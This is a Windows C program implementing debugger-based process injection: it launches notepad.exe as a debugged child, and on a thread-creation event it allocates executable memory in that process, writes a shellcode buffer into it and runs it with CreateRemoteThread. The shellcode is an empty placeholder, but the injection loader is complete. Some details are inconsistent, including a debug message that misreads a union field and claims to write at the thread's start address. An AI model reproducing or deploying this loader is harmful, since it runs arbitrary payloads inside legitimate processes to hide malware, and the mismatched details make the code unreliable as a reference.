#include <Windows.h>
#include <stdio.h>
#include <psapi.h>

// Payload
unsigned char shellcode[] = { 0x00 };

// Function to find the handle of the target process by name
BOOL FindProcessHandle(LPCWSTR targetProcessName, DWORD* processId, HANDLE* processHandle) {
    DWORD processIds[1024], cbNeeded, processCount;

    // Enumerate all processes in the system
    if (!EnumProcesses(processIds, sizeof(processIds), &cbNeeded)) {
        printf("[!] Error: Failed to enumerate processes. Error code: %d\n", GetLastError());
        return FALSE;
    }

    processCount = cbNeeded / sizeof(DWORD);

    // Loop through all process IDs
    for (unsigned int i = 0; i < processCount; i++) {
        if (processIds[i] != 0) {
            // Try to open the process with query and read access
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
            if (hProc) {
                WCHAR currentProcessName[MAX_PATH] = L"<unknown>";

                HMODULE hMod;
                DWORD cbNeededMod;
                // Get the base module of the process (to retrieve the process name)
                if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbNeededMod)) {
                    GetModuleBaseName(hProc, hMod, currentProcessName, sizeof(currentProcessName) / sizeof(WCHAR));
                }

                // Convert both process names to lowercase for case-insensitive comparison
                WCHAR lowerCurrentName[MAX_PATH];
                WCHAR lowerTargetName[MAX_PATH];
                for (int j = 0; currentProcessName[j]; j++)
                    lowerCurrentName[j] = (WCHAR)tolower(currentProcessName[j]);
                lowerCurrentName[lstrlenW(currentProcessName)] = '\0';

                for (int j = 0; targetProcessName[j]; j++)
                    lowerTargetName[j] = (WCHAR)tolower(targetProcessName[j]);
                lowerTargetName[lstrlenW(targetProcessName)] = '\0';

                // If the process name matches the target process name, open it with full access
                if (wcscmp(lowerCurrentName, lowerTargetName) == 0) {
                    *processId = processIds[i];
                    *processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processIds[i]);
                    if (*processHandle == NULL) {
                        printf("[!] Error: Failed to open target process. Error code: %d\n", GetLastError());
                    }

                    CloseHandle(hProc);
                    return TRUE;
                }
                CloseHandle(hProc);
            }
        }
    }

    printf("[!] Error: Target process not found.\n");
    return FALSE;
}


// Function to inject shellcode into the target process
BOOL InjectShellcode(HANDLE hProcess, LPVOID* remoteMem) {
    SIZE_T numBytesWritten;

    // Allocate memory in the target process
    *remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!*remoteMem) {
        printf("[!] Failed to allocate memory in target process. Error: %d\n", GetLastError());
        return FALSE;
    }

    // Write shellcode to the allocated memory
    if (!WriteProcessMemory(hProcess, *remoteMem, shellcode, sizeof(shellcode), &numBytesWritten) || numBytesWritten != sizeof(shellcode)) {
        printf("[!] Failed to write shellcode into target process. Error: %d\n", GetLastError());
        return FALSE;
    }

    // Create remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)*remoteMem, NULL, 0, NULL);
    if (!hThread) {
        printf("[!] Failed to create remote thread in target process. Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Shellcode injected and remote thread created successfully.\n");
    CloseHandle(hThread);
    return TRUE;
}

int main() {
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    DEBUG_EVENT de = { 0 };
    SIZE_T numBytesWritten;

    LPVOID remoteMem = NULL;  // Declare remoteMem here
    WCHAR targetProcess[MAX_PATH] = L"C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessW(targetProcess, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &si, &pi)) {
        printf("[!] CreateProcessW failed with error: %d\n", GetLastError());
        return -1;
    }

    printf("[+] Process created with PID: %d\n", pi.dwProcessId);

    // Debug event loop
    while (WaitForDebugEvent(&de, INFINITE)) {
        switch (de.dwDebugEventCode) {
        case CREATE_THREAD_DEBUG_EVENT: {
            printf("[+] Targetting Thread: %d\n", GetThreadId(de.u.CreateThread.hThread));
            printf("[i] Writing Shellcode At Thread's Start Address: 0x%p \n", de.u.CreateProcessInfo.lpStartAddress);

            // Inject shellcode into the process
            if (!InjectShellcode(pi.hProcess, &remoteMem)) {
                return -1;
            }

            // Detach child process
            if (!DebugActiveProcessStop(pi.dwProcessId)) {
                printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
                return -1;
            }

            // Resume thread creation
            ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
            // Exit
            goto cleanup;
        }

        case EXIT_PROCESS_DEBUG_EVENT:
            printf("[i] Remote Process Terminated \n");
            return 0;

        default:
            break;
        }

        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
    }

cleanup:
    DebugActiveProcessStop(pi.dwProcessId);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
